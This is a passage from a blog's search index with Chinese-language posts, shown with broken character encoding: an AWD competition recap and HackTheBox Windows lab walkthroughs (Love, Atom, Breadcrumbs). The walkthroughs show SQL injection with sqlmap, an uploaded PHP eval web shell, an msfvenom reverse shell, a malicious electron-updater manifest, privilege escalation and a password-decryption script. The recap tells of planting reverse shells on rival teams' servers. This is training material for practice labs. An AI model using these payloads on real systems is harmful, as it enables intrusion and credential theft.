EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"CISCN-SE_Semifinal","slug":"CISCN-SE-Semifinal","date":"2021-07-04T20:21:31.000Z","updated":"2021-07-04T09:00:38.000Z","comments":true,"path":"2021/07/04/CISCN-SE-Semifinal/","link":"","permalink":"https://yoloyolo.top/2021/07/04/CISCN-SE-Semifinal/","excerpt":"25/60 ä¸‰ç­‰å¥–(äºŒç­‰å¥–å®ˆé—¨å‘˜)","text":"25/60 ä¸‰ç­‰å¥–(äºŒç­‰å¥–å®ˆé—¨å‘˜) äººæ‰‹ä¸è¶³ï¼ˆ3/4ï¼‰ ç¬¬äºŒå¤©çš„æ¯”èµ›æ—¶é—´æå‰å¯¼è‡´çŠ¶æ€ä¸ä½³ â€¦ ç”±äºå„ç§å„æ ·çš„åŸå› ï¼Œæ‹¿åˆ°äº†è¿™ä¸ªåæ¬¡ï¼Œé—æ†¾ä¹Ÿä¸èƒ½è¯´ä¸€ç‚¹éƒ½æ²¡æœ‰ ä½†ä¹Ÿè¶³å¤Ÿäº† é¦–å…ˆèŠä¸‹è¿™ä¸ªæ¯”èµ›çš„å¾—åˆ†æœºåˆ¶ è¢«Getflagä¼šè¢«æ‰£100åˆ†ï¼Œç”±æ”»å‡»é˜Ÿä¼å¹³æ‘Š è¢«Checkä¼šè¢«æ‰£100åˆ†ï¼Œç”±æœåŠ¡æ­£å¸¸çš„é˜Ÿä¼å¹³æ‘Š å…ˆä¸è¯´DOSæ…å±äº†ï¼ŒåŒæ—¶è¢«Getflagå’Œè¢«Checkçš„æƒ…å†µæ˜¯è¦å°½é‡é¿å…çš„ï¼Œå®åœ¨çœ‹ä¸åˆ°æ€ä¹ˆè¢«æ‰“çš„å°±åˆ ç«™æ‹‰å€’ å½“ç„¶ï¼Œèƒ½ä¿è¯æœåŠ¡è¿è¡Œä¹Ÿæ˜¯ä»¶å¥½äº‹ï¼Œå› ä¸ºæ¯”èµ›ä¸­åæœŸå‡ºç°äº†ä¸€å¤§åŠå®•æœºçš„æƒ…å†µï¼Œå³ä½¿è¢«æ‰“äº†ï¼Œåªè¦ä¿è¯æœåŠ¡çš„æ­£å¸¸åè€Œå¯ä»¥ä¸Šåˆ† å…¶æ¬¡ï¼ŒPWNæœºæˆ‘ä»¬ä¸ä¼šæ‰“ä¹Ÿä¸ä¼šä¿®ï¼Œä½†æ˜¯ä¸å¦¨ç¢æˆ‘ä»¬æ‹¿åˆ«äººçš„Payloadæ‰“åˆ«äººï¼ˆpwntoolsé‡æ”¾æµé‡å°±å®Œäº‹äº†ï¼‰ ç”±äºè‡ªå·±çš„ç–å¿½ï¼Œæ²¡åœ¨ç¬¬ä¸€æ—¶é—´æ³¨æ„åˆ°æœåŠ¡å™¨ä¸Šçš„æµé‡å¤‡ä»½ï¼Œé”™å¤±äº†å‡ åƒåˆ† å¦å¤–ï¼Œç”±äºPWNçš„Getflagæ˜¯ç»™å‡ºä¸€ä¸ªshæ¥æ‰§è¡Œcat /flagï¼Œè€Œä¸æ˜¯è‡ªåŠ¨æ‰§è¡Œcat /flagï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥ç•™ä½è¿™ä¸ªshï¼Œåé¢å†ç»§ç»­Getflagï¼ˆåˆ«äººçš„æ€è·¯ï¼Œå¤ªéªšäº†ï¼‰ å¦‚æœç¢°å·§åˆ«äººåˆ æ‰äº†ç¨‹åºæ”¾å¼ƒè¿ç»´ï¼Œå°±å¯ä»¥åŒå€æ‰£åˆ† Webçš„å°±å¥½è¯´äº†ï¼Œçœ‹çœ‹è‡ªå·±æœåŠ¡å™¨ä¸Šæœ‰å“ªäº›é©¬ï¼Œç„¶åæ‰¹é‡ä¸Šé©¬ï¼Œç„¶åä»æµé‡é‡Œé¢ç¿»åˆ«äººçš„Payload ç”±äºæ²¡æœ‰åšç½‘ç»œéš”ç¦»ï¼ˆèµ›å‰nmapäº†ä¸‹ï¼Œèƒ½é€šå…¶ä»–é˜Ÿçš„æœåŠ¡å™¨å’Œé€‰æ‰‹æœºå™¨ï¼‰ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥åœ¨åˆ«äººçš„æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªMeterpreterçš„åå¼¹Shellé©¬ ä»é˜²å®ˆæ–¹æ¥è®²ï¼Œç¨‹åºé©¬çš„è¿è¡Œæƒé™æ˜¯www-dataï¼Œè¿ç»´çš„æƒé™æ˜¯ctfï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥è‡ªå·±å†™ä¸€ä¸ªåé—¨æ¥è·å¾—www-dataæƒé™ï¼Œç„¶åå°±å¯ä»¥ç”¨systemå‡½æ•°æ¥killæ‰ç¨‹åºé©¬ è¿™ä¸ªæ€è·¯åŒæ ·å¯ä»¥ç”¨æ¥è¿ç»´å…¶ä»–çš„æƒ…å†µ è¿™æ¬¡æ¯”èµ›Banäº†ä¸æ­»é©¬ æ‰€ä»¥ï¼Œç†æƒ³åŒ–çš„AWDæµç¨‹ï¼Œå…¶å®è¿˜æ˜¯åº”è¯¥æŒ‰CTFçš„æ€è·¯æ¥ Aè´Ÿè´£æºç å®¡è®¡ä»¥åŠä¿®å¤ Bè´Ÿè´£ç›‘ç®¡æµé‡æ¥æŸ¥çœ‹æœåŠ¡å™¨ä¸Šçš„åé—¨ä»¥åŠå…¶ä»–é˜Ÿä¼çš„Payload Cè´Ÿè´£è„šæœ¬ç¼–å†™ä»¥åŠè¿ç»´ Dè´Ÿè´£è„šæœ¬ç¼–å†™çœŸç©ºæœŸçš„æ‰‹åŠ¨æäº¤flagä»¥åŠå…¶ä»–å·¥ä½œï¼ˆä¾‹å¦‚PWNé¢˜çš„shä¿ç•™ï¼‰ AæŒ–åˆ°æ¼æ´å°±è®©Cå†™Getflagè„šæœ¬ï¼ŒåŒæ—¶Då¯ä»¥æ‰‹åŠ¨Getflag Bçœ‹åˆ°Payloadå°±å¯ä»¥è®©Aè¿›è¡Œä¿®å¤ï¼Œå¹¶è®©Cç¼–å†™Getflagè„šæœ¬ï¼ŒåŒæ—¶Då¯ä»¥æ‰‹åŠ¨Getflag å­¦åˆ°äº†å¾ˆå¤šï¼Œå¸Œæœ›ä»¥åèƒ½ç”¨å¾—ä¸Šè¿™äº›ç»éªŒ","categories":[{"name":"Talk","slug":"Talk","permalink":"https://yoloyolo.top/categories/Talk/"}],"tags":[{"name":"AWD","slug":"AWD","permalink":"https://yoloyolo.top/tags/AWD/"},{"name":"CISCN","slug":"CISCN","permalink":"https://yoloyolo.top/tags/CISCN/"}]},{"title":"HackTheBox_Windows_Set_0","slug":"HackTheBox-Windows-Set-0","date":"2021-06-09T21:20:32.000Z","updated":"2023-02-14T15:38:32.000Z","comments":true,"path":"2021/06/09/HackTheBox-Windows-Set-0/","link":"","permalink":"https://yoloyolo.top/2021/06/09/HackTheBox-Windows-Set-0/","excerpt":"The more knowledge you drink, the more thirsty you are.","text":"The more knowledge you drink, the more thirsty you are. HackTheBox_love ç«¯å£æ‰«æ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546nmap -sV -sT -Pn 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.87s latency).Not shown: 993 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=6/9%Time=60C04557%P=x86_64-pc-linux-gnu%r(NULSF:L,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowedSF:\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(GenericLines,4SF:9,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x2SF:0to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(HTTPOptions,49,&quot;ESF:\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\SF:x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(RPCCheck,49,&quot;E\\0\\0\\x0SF:1\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connSF:ect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(DNSStatusRequestTCP,49,&quot;E\\0\\SF:0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20SF:connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(TerminalServerCookie,49,SF:&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20tSF:o\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(Kerberos,49,&quot;E\\0\\0\\SF:x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20coSF:nnect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(X11Probe,49,&quot;E\\0\\0\\x01\\xffSF:j\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\xSF:20to\\x20this\\x20MariaDB\\x20server&quot;)%r(FourOhFourRequest,49,&quot;E\\0\\0\\x01\\xSF:ffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connectSF:\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(LDAPSearchReq,49,&quot;E\\0\\0\\x01\\xffSF:j\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\xSF:20to\\x20this\\x20MariaDB\\x20server&quot;)%r(LDAPBindReq,49,&quot;E\\0\\0\\x01\\xffj\\x0SF:4Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20toSF:\\x20this\\x20MariaDB\\x20server&quot;)%r(SIPOptions,49,&quot;E\\0\\0\\x01\\xffj\\x04HostSF:\\x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20tSF:his\\x20MariaDB\\x20server&quot;)%r(TerminalServer,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\SF:x20&#x27;10\\.10\\.16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20thSF:is\\x20MariaDB\\x20server&quot;)%r(NCP,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.SF:16\\.2&#x27;\\x20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDSF:B\\x20server&quot;)%r(JavaRMI,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.2&#x27;\\xSF:20is\\x20not\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20serSF:ver&quot;);Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows 1234567891011121314151617181920nmap -A -p 443 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.75s latency).PORT STATE SERVICE VERSION443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows 10 1709 - 1909 (95%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (92%), Microsoft Windows Server 2008 SP2 (92%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Hosts: www.example.com, www.love.htb è¿™é‡Œéœ€è¦å¯¹SSLç«¯å£è¿›è¡Œæ›´åŠ è¯¦ç»†çš„æ‰«ææ‰èƒ½å¾—åˆ°åŸŸåstaging.love.htb ä¸ä½¿ç”¨åŸŸåè®¿é—®443ç«¯å£åˆ™ä¼šè¢«403 5000ç«¯å£åˆ™æ˜¯ç›´æ¥403 æ¼æ´åˆ©ç”¨ ç”¨åŸŸåè®¿é—®443ç«¯å£å¯ä»¥çœ‹åˆ°ä¸€ä¸ªLFIæ¼æ´ fileåè®®è¯»å–å³å¯ 123456789101112131415161718192021222324252627282930313233&lt;?php #C:\\xampp\\htdocs\\omrs\\login.php session_start(); include &#x27;includes/conn.php&#x27;; if(isset($_POST[&#x27;login&#x27;]))&#123; $voter = $_POST[&#x27;voter&#x27;]; $password = $_POST[&#x27;password&#x27;]; $sql = &quot;SELECT * FROM voters WHERE voters_id = &#x27;$voter&#x27;&quot;; $query = $conn-&gt;query($sql); if($query-&gt;num_rows &lt; 1)&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Cannot find voter with the ID&#x27;; &#125; else&#123; $row = $query-&gt;fetch_assoc(); if(password_verify($password, $row[&#x27;password&#x27;]))&#123; $_SESSION[&#x27;voter&#x27;] = $row[&#x27;id&#x27;]; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Incorrect password&#x27;; &#125; &#125; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Input voter credentials first&#x27;; &#125; header(&#x27;location: index.php&#x27;);?&gt; 123456789&lt;?php #C:\\xampp\\htdocs\\omrs\\admin\\includes\\conn.php $conn = new mysqli(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;&#x27;, &#x27;votesystem&#x27;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_error); &#125; ?&gt; 123456789101112131415161718192021222324252627282930313233&lt;?php #C:\\xampp\\htdocs\\omrs\\admin\\login.php session_start(); include &#x27;includes/conn.php&#x27;; if(isset($_POST[&#x27;login&#x27;]))&#123; $username = $_POST[&#x27;username&#x27;]; $password = $_POST[&#x27;password&#x27;]; $sql = &quot;SELECT * FROM admin WHERE username = &#x27;$username&#x27;&quot;; $query = $conn-&gt;query($sql); if($query-&gt;num_rows &lt; 1)&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Cannot find account with the username&#x27;; &#125; else&#123; $row = $query-&gt;fetch_assoc(); if(password_verify($password, $row[&#x27;password&#x27;]))&#123; $_SESSION[&#x27;admin&#x27;] = $row[&#x27;id&#x27;]; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Incorrect password&#x27;; &#125; &#125; &#125; else&#123; $_SESSION[&#x27;error&#x27;] = &#x27;Input admin credentials first&#x27;; &#125; header(&#x27;location: index.php&#x27;);?&gt; 123456789&lt;?php #C:\\xampp\\htdocs\\omrs\\admin\\includes\\conn.php $conn = new mysqli(&#x27;localhost&#x27;, &#x27;root&#x27;, &#x27;&#x27;, &#x27;votesystem&#x27;); if ($conn-&gt;connect_error) &#123; die(&quot;Connection failed: &quot; . $conn-&gt;connect_error); &#125; ?&gt; æ˜æ˜¾åœ°å­˜åœ¨SQLæ³¨å…¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667sqlmap -u &quot;http://10.10.10.239/login.php&quot; -data &quot;voter=123&amp;password=321&amp;login=&quot; --dbsavailable databases [6]:[*] information_schema[*] mysql[*] performance_schema[*] phpmyadmin[*] test[*] votesystemsqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem --tablesDatabase: votesystem[5 tables]+------------+| admin || candidates || positions || voters || votes |+------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T admin --columnsDatabase: votesystemTable: admin[7 columns]+------------+--------------+| Column | Type |+------------+--------------+| created_on | date || firstname | varchar(50) || id | int(11) || lastname | varchar(50) || password | varchar(60) || photo | varchar(150) || username | varchar(50) |+------------+--------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T admin -C username, password --dumpDatabase: votesystemTable: admin[1 entry]+----------+--------------------------------------------------------------+| username | password |+----------+--------------------------------------------------------------+| admin | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC |+----------+--------------------------------------------------------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T voters --columnsDatabase: votesystemTable: voters[6 columns]+-----------+--------------+| Column | Type |+-----------+--------------+| firstname | varchar(30) || id | int(11) || lastname | varchar(30) || password | varchar(60) || photo | varchar(150) || voters_id | varchar(15) |+-----------+--------------+sqlmap -u &quot;http://10.10.10.239/admin/login.php&quot; -data &quot;username=123&amp;password=321&amp;login=&quot; -D votesystem -T voters -C voters_id, password --dump+-----------+----------+| voters_id | password |+-----------+----------++-----------+----------+ ç„¶è€Œè¿™é‡ŒHashçˆ†ç ´é€Ÿåº¦è¿‡æ…¢, Bcryptçš„è¿ç®—å¤æ‚ç¨‹åº¦è¿œé«˜äºmd5 çœ‹äº†çœ¼åˆ«äººWP ç”¨443ç«¯å£çš„åŠŸèƒ½è®¿é—®æœ¬åœ°5000å¾—åˆ°ç™»å…¥å‡­è¯ admin:@LoveIsInTheAir!!!! ä¸€ç›´ç”¨æ¸—é€çš„å¸¸è§„æ€è·¯æ‰“è¿™å°é¶æœº, æ²¡æƒ³åˆ°æ•´è¿™ä¹ˆä¸€å‡º ç™»å…¥åå°åä¸Šä¼ Shel 1234567891011121314151617181920212223242526272829303132333435363738POST /admin/voters_add.php HTTP/1.1Host: 10.10.10.239User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------7586397232801671174932942436Content-Length: 696Origin: http://10.10.10.239Connection: closeReferer: http://10.10.10.239/admin/voters.phpCookie: PHPSESSID=uofg65u57tbm4rp6jbn0359660Upgrade-Insecure-Requests: 1-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;firstname&quot;1-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;lastname&quot;2-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;password&quot;333-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;photo&quot;; filename=&quot;shell.php&quot;Content-Type: image/jpeg&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;-----------------------------7586397232801671174932942436Content-Disposition: form-data; name=&quot;add&quot;-----------------------------7586397232801671174932942436-- èšå‰‘ä¸Šä¼ ncåå¼¹shell 12type c:\\users\\phoebe\\desktop\\user.txtfc8833cab6af6700441328fd2a4ecc04 æƒé™æå‡ æ‰¾åˆ°alwaysinstallelevatedï¼Œå³å½“æ³¨å†Œè¡¨ä¸­çš„alwaysinstallelevatedè®¾ç½®ä¸º1æ—¶ï¼Œæœºå™¨ä¸Šè¿è¡Œä»»ä½•çš„msiç¨‹åºï¼Œå‡ä¼šä»¥systemæƒé™æ‰§è¡Œï¼Œæˆ‘ä»¬åªéœ€ç”Ÿæˆä¸€ä¸ªmsiçš„æœ¨é©¬ç¨‹åºå³å¯ææƒã€‚ https://zhuanlan.zhihu.com/p/375373404 123456789reg query HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\InstallerHKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\InstallerHKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1 msfvenomç”Ÿæˆä¸€ä¸ªShellå³å¯ 12type c:\\users\\administrator\\desktop\\root.txta0f54f7853efdefe4c8cef97186db4c8 msfvenom &amp; nc æœ¬ç€èƒ½ä¸ç”¨MSFå°±ä¸ç”¨äº†MSFçš„åŸåˆ™ æ²¡æœ‰ä½¿ç”¨meterpreter ä½†æ˜¯å‘ç°æœ‰(staged)æ ‡è¯†è¿˜æ˜¯ä¸èƒ½ç”¨ncç›´æ¥æ¥æ”¶Shellçš„ æœ€åç”¨windows/x64/shell/reverse_tcp HackTheBox_Atom ç«¯å£æ‰«æ 1234567891011nmap -sV -sT -Pn 10.10.10.237Nmap scan report for 10.10.10.237Host is up (0.30s latency).Not shown: 996 filtered portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)135/tcp open msrpc Microsoft Windows RPC443/tcp open ssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)445/tcp open microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows æ¼æ´åˆ©ç”¨ 123456789smbclient -L 10.10.10.237 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Software_Updates Disk SMB1 disabled -- no workgroup available 1234567891011smbclient \\\\\\\\10.10.10.237\\\\software_updatessmb: \\&gt; dir . D 0 Fri Jun 11 11:18:21 2021 .. D 0 Fri Jun 11 11:18:21 2021 client1 D 0 Fri Jun 11 11:18:21 2021 client3 D 0 Fri Jun 11 11:18:21 2021 UAT_Testing_Procedures.pdf A 35202 Fri Apr 9 19:18:08 2021 4413951 blocks of size 4096. 1381036 blocks availablesmb: \\&gt; get UAT_Testing_Procedures.pdfgetting file \\UAT_Testing_Procedures.pdf of size 35202 as UAT_Testing_Procedures.pdf (6.3 KiloBytes/sec) (average 6.3 KiloBytes/sec) Note taking application built with electron-builder which helps users in taking important notes. electron-builderå¯ä»¥åœ¨googleä¸Šæœåˆ°ä¸€ä¸ªRCEæ¼æ´ https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html æ„é€ payload 123456msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=9996 -f exe &gt; s\\&#x27;hell.execat latest.ymlversion: 1.2.3path: http://10.10.16.3:9999/s&#x27;hell.exesha512: pyfnrQs40RwrwKOWykgeZ0PKeSudGkN1UI/9j+PpxG4M42uY88j/hNAx7xWonk57X0GMdPIOma9FsfeBglTLMQ== å¼€å¯HTTPæœåŠ¡ 1python3 -m http.server 9999 å°†latest.ymlä¸Šä¼ è‡³client*æ–‡ä»¶å¤¹ä¸­ 12type c:\\users\\jason\\desktop\\user.txt3eda0e1bce259d8ffd4c1994f84bfdea æƒé™æå‡ 12type c:\\&quot;program files&quot;\\redis\\redis.windows.confrequirepass kidvscat_yes_kidvscat 12345678910redis-cli -h 10.10.10.237 -a kidvscat_yes_kidvscatkeys *1) &quot;pk:ids:User&quot;2) &quot;pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;3) &quot;pk:ids:MetaDataClass&quot;4) &quot;pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff&quot;get pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0&quot;&#123;\\&quot;Id\\&quot;:\\&quot;e8e29158d70d44b1a1ba4949d52790a0\\&quot;,\\&quot;Name\\&quot;:\\&quot;Administrator\\&quot;,\\&quot;Initials\\&quot;:\\&quot;\\&quot;,\\&quot;Email\\&quot;:\\&quot;\\&quot;,\\&quot;EncryptedPassword\\&quot;:\\&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi\\&quot;,\\&quot;Role\\&quot;:\\&quot;Admin\\&quot;,\\&quot;Inactive\\&quot;:false,\\&quot;TimeStamp\\&quot;:637530169606440253&#125;&quot; 123dir c:\\users\\jason\\downloads\\d----- 4/2/2021 8:21 PM PortableKanban å­˜åœ¨ä¸€ä¸ªå¯†ç æ¢å¤çš„æ¼æ´ 123456789101112#!/usr/bin/env python3import jsonimport base64from des import * # python3 -m pip install desimport sysdef decode(hash): hash = base64.b64decode(hash.encode(&#x27;utf-8&#x27;)) key = DesKey(b&quot;7ly6UznJ&quot;) return key.decrypt(hash,initial=b&quot;XuVUm5fR&quot;,padding=True).decode(&#x27;utf-8&#x27;)print(decode(&quot;Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi&quot;)) å¾—åˆ°kidvscat_admin_@123 evil-rmç™»å…¥ 12type c:\\users\\administrator\\desktop\\root.txt2b36cf6bd3cd95fc37d6e2f81e80163b è¿™ææƒéƒ¨åˆ†å®åœ¨æ˜¯è¿‡äºç‰µå¼ºäº†â€¦ HackTheBox_Breadcrumbs ç«¯å£æ‰«æ 123456789101112131415161718192021nmap -sV -sT -Pn 10.10.10.228Nmap scan report for 10.10.10.228Host is up (0.38s latency).Not shown: 992 closed portsPORTSTATE SERVICE VERSION22/tcp openssh OpenSSH for_Windows_7.7 (protocol 2.0)80/tcp openhttp Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)135/tcp openmsrpcMicrosoft Windows RPC139/tcp opennetbios-ssn Microsoft Windows netbios-ssn443/tcp openssl/http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)445/tcp openmicrosoft-ds?1107/tcp filtered isoipsigport-23306/tcp openmysql?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=6/11%Time=60C2E951%P=x86_64-pc-linux-gnu%r(NUSF:LL,49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.3&#x27;\\x20is\\x20not\\x20alloweSF:d\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;)%r(GenericLines,SF:49,&quot;E\\0\\0\\x01\\xffj\\x04Host\\x20&#x27;10\\.10\\.16\\.3&#x27;\\x20is\\x20not\\x20allowed\\xSF:20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server&quot;);Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows è·¯å¾„æ‰«æ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556dirb http://10.10.10.228/---- Scanning URL: http://10.10.10.228/ ----+ http://10.10.10.228/aux (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/books/==&gt; DIRECTORY: http://10.10.10.228/Books/+ http://10.10.10.228/cgi-bin/ (CODE:403|SIZE:301)+ http://10.10.10.228/com1 (CODE:403|SIZE:301)+ http://10.10.10.228/com2 (CODE:403|SIZE:301)+ http://10.10.10.228/com3 (CODE:403|SIZE:301)+ http://10.10.10.228/con (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/css/==&gt; DIRECTORY: http://10.10.10.228/db/==&gt; DIRECTORY: http://10.10.10.228/DB/+ http://10.10.10.228/examples (CODE:503|SIZE:401)==&gt; DIRECTORY: http://10.10.10.228/includes/+ http://10.10.10.228/index.php (CODE:200|SIZE:2368)==&gt; DIRECTORY: http://10.10.10.228/js/+ http://10.10.10.228/licenses (CODE:403|SIZE:420)+ http://10.10.10.228/lpt1 (CODE:403|SIZE:301)+ http://10.10.10.228/lpt2 (CODE:403|SIZE:301)+ http://10.10.10.228/nul (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/php/==&gt; DIRECTORY: http://10.10.10.228/PHP/+ http://10.10.10.228/phpmyadmin (CODE:403|SIZE:301)==&gt; DIRECTORY: http://10.10.10.228/portal/+ http://10.10.10.228/prn (CODE:403|SIZE:301)+ http://10.10.10.228/server-info (CODE:403|SIZE:420)+ http://10.10.10.228/server-status (CODE:403|SIZE:420)+ http://10.10.10.228/webalizer (CODE:403|SIZE:301)---- Entering directory: http://10.10.10.228/portal/ ----==&gt; DIRECTORY: http://10.10.10.228/portal/assets/+ http://10.10.10.228/portal/aux (CODE:403|SIZE:301)+ http://10.10.10.228/portal/com1 